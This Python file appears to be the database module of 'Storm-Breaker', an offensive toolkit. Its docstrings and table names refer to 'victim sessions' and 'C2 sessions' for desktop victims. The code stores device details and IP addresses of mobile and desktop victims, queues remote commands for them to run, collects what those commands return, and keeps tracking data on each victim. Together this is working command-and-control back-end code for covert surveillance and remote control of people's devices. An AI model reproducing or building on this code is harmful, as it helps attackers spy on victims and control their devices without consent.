"""
Storm-Breaker Database Module
Provides persistent storage for victim sessions
"""

import sqlite3
import json
from datetime import datetime
import os

DB_PATH = os.path.join(os.path.dirname(__file__), 'storm_breaker.db')

def init_database():
    """Initialize the database with required tables"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    # Mobile Sessions Table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mobile_sessions (
            uid TEXT PRIMARY KEY,
            info TEXT,
            ip TEXT,
            last_seen TEXT,
            registered_at TEXT,
            first_seen TEXT
        )
    ''')
    
    # C2 Sessions Table (for desktop victims)
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS c2_sessions (
            uid TEXT PRIMARY KEY,
            info TEXT,
            ip TEXT,
            last_seen TEXT,
            registered_at TEXT,
            first_seen TEXT
        )
    ''')
    
    # Mobile Commands Queue
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mobile_commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            command TEXT,
            timestamp TEXT,
            executed INTEGER DEFAULT 0
        )
    ''')
    
    # Mobile Responses Queue
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mobile_responses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            output TEXT,
            timestamp TEXT,
            retrieved INTEGER DEFAULT 0
        )
    ''')
    
    # Tracking Data
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tracking_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            uid TEXT,
            data TEXT,
            timestamp TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

# ===== MOBILE SESSIONS =====

def save_mobile_session(uid, info, ip):
    """Save or update a mobile session"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    
    # Check if session exists
    cursor.execute('SELECT uid, first_seen FROM mobile_sessions WHERE uid = ?', (uid,))
    existing = cursor.fetchone()
    
    if existing:
        # Update existing session
        cursor.execute('''
            UPDATE mobile_sessions 
            SET info = ?, ip = ?, last_seen = ?, registered_at = ?
            WHERE uid = ?
        ''', (json.dumps(info), ip, now, now, uid))
    else:
        # Insert new session
        cursor.execute('''
            INSERT INTO mobile_sessions (uid, info, ip, last_seen, registered_at, first_seen)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (uid, json.dumps(info), ip, now, now, now))
    
    conn.commit()
    conn.close()

def get_mobile_session(uid):
    """Get a specific mobile session"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM mobile_sessions WHERE uid = ?', (uid,))
    row = cursor.fetchone()
    conn.close()
    
    if row:
        return {
            'uid': row[0],
            'info': json.loads(row[1]) if row[1] else {},
            'ip': row[2],
            'last_seen': row[3],
            'registered_at': row[4],
            'first_seen': row[5]
        }
    return None

def get_all_mobile_sessions():
    """Get all mobile sessions"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM mobile_sessions ORDER BY last_seen DESC')
    rows = cursor.fetchall()
    conn.close()
    
    sessions = {}
    for row in rows:
        sessions[row[0]] = {
            'uid': row[0],
            'info': json.loads(row[1]) if row[1] else {},
            'ip': row[2],
            'last_seen': row[3],
            'registered_at': row[4],
            'first_seen': row[5]
        }
    
    return sessions

def update_mobile_last_seen(uid):
    """Update last seen timestamp for a mobile session"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('UPDATE mobile_sessions SET last_seen = ? WHERE uid = ?', (now, uid))
    
    conn.commit()
    conn.close()

def delete_mobile_session(uid):
    """Delete a mobile session"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('DELETE FROM mobile_sessions WHERE uid = ?', (uid,))
    cursor.execute('DELETE FROM mobile_commands WHERE uid = ?', (uid,))
    cursor.execute('DELETE FROM mobile_responses WHERE uid = ?', (uid,))
    cursor.execute('DELETE FROM tracking_data WHERE uid = ?', (uid,))
    
    conn.commit()
    conn.close()

# ===== MOBILE COMMANDS =====

def add_mobile_command(uid, command):
    """Add a command to the queue"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO mobile_commands (uid, command, timestamp, executed)
        VALUES (?, ?, ?, 0)
    ''', (uid, command, now))
    
    conn.commit()
    conn.close()

def get_mobile_commands(uid):
    """Get pending commands for a UID"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, command FROM mobile_commands 
        WHERE uid = ? AND executed = 0 
        ORDER BY id ASC
    ''', (uid,))
    
    rows = cursor.fetchall()
    conn.close()
    
    return rows

def mark_command_executed(command_id):
    """Mark a command as executed"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('UPDATE mobile_commands SET executed = 1 WHERE id = ?', (command_id,))
    
    conn.commit()
    conn.close()

# ===== MOBILE RESPONSES =====

def add_mobile_response(uid, output):
    """Add a response to the queue"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO mobile_responses (uid, output, timestamp, retrieved)
        VALUES (?, ?, ?, 0)
    ''', (uid, output, now))
    
    conn.commit()
    conn.close()

def get_mobile_response(uid):
    """Get the oldest unread response for a UID"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT id, output FROM mobile_responses 
        WHERE uid = ? AND retrieved = 0 
        ORDER BY id ASC 
        LIMIT 1
    ''', (uid,))
    
    row = cursor.fetchone()
    
    if row:
        # Mark as retrieved
        cursor.execute('UPDATE mobile_responses SET retrieved = 1 WHERE id = ?', (row[0],))
        conn.commit()
        conn.close()
        return row[1]
    
    conn.close()
    return None

# ===== TRACKING DATA =====

def add_tracking_data(uid, data):
    """Add tracking data"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    now = datetime.now().isoformat()
    cursor.execute('''
        INSERT INTO tracking_data (uid, data, timestamp)
        VALUES (?, ?, ?)
    ''', (uid, json.dumps(data), now))
    
    conn.commit()
    conn.close()

def get_tracking_data(uid, limit=100):
    """Get tracking data for a UID"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        SELECT data, timestamp FROM tracking_data 
        WHERE uid = ? 
        ORDER BY id DESC 
        LIMIT ?
    ''', (uid, limit))
    
    rows = cursor.fetchall()
    conn.close()
    
    return [{'data': json.loads(row[0]), 'timestamp': row[1]} for row in rows]

# ===== CLEANUP =====

def cleanup_old_data(days=30):
    """Clean up data older than specified days"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    from datetime import timedelta
    cutoff = (datetime.now() - timedelta(days=days)).isoformat()
    
    cursor.execute('DELETE FROM mobile_commands WHERE timestamp < ? AND executed = 1', (cutoff,))
    cursor.execute('DELETE FROM mobile_responses WHERE timestamp < ? AND retrieved = 1', (cutoff,))
    cursor.execute('DELETE FROM tracking_data WHERE timestamp < ?', (cutoff,))
    
    conn.commit()
    conn.close()

# Initialize database on import
init_database()
